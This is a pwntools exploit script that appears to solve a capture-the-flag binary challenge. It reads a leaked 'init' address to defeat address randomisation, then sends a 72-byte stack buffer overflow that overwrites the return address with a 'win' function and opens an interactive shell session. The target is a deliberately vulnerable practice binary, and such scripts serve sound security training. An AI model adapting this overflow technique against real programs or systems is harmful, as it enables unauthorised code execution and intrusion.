#!/usr/bin/env python3
from pwn import *
import sys
FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.recvuntil(b"This is an address of init function: ")
init = int(r.recvuntil(b"\n"), 16)

exe.address = init - exe.symbols["init"]
win = exe.symbols["win"]
# win = init - exe.symbols["init"] + exe.symbols["win"]

log.info("init: " + hex(init))
log.info("win: " + hex(win))

payload = b'A' * 72 + p64(win + 4)
r.recvuntil(b"Input your data: ")
r.sendline(payload)

r.interactive()
